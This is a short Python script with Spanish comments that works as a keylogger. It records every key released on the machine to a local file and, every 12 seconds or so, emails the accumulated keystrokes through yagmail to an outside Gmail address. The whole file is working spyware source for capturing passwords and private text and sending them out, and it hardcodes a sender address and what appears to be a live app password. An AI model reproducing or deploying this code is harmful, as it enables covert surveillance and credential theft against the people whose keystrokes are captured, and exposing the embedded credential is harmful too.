import keyboard
import yagmail
import time

reg = []
last_email_time = time.time()  # Inicializar last_email_time con el tiempo actual

def main():
    global last_email_time  # Declarar last_email_time como una variable global

    archivo = open("registro_teclado.txt", "w")  # Abrir el archivo en modo escritura

    try:
        archivo.write("Registro de pulsaciones del teclado:\n")
        archivo.write("Presiona 'q' para salir.\n")
        while True:
            evento = keyboard.read_event()
            if evento.event_type == keyboard.KEY_UP:  # Verificar si es una tecla liberada
                tecla_liberada = evento.name
                registro = f"Tecla liberada: {tecla_liberada}\n"
                reg.append(registro)  # Agrega el registro a la lista
                archivo.write(registro)
                print(registro, end='')  # Imprime en la consola también

            if evento.name == 'q':
                break

            # Verifica si ha pasado al menos 10 segundos desde el último correo
            current_time = time.time()
            if current_time - last_email_time >= 12:
                send_email()
                last_email_time = current_time
    except KeyboardInterrupt:
        pass
    finally:
        archivo.close()  # Cerrar el archivo al salir

def send_email():
    email = 'jeanandresprimos123@gmail.com'
    contrasena = 'hdpblztngtcipxbe'

    destinatario = ['pomai0236@gmail.com']
    asunto = 'saludo'
    
    mensaje = reg  # Captura el contenido actual del registro cada vez
    yag = yagmail.SMTP(user=email, password=contrasena)
    yag.send(destinatario, asunto, mensaje)
    yag.close()  # Cierra la conexión SMTP después de enviar el correo
    print(f"Correo enviado a {destinatario} con asunto: {asunto}")

if __name__ == "__main__":
    main()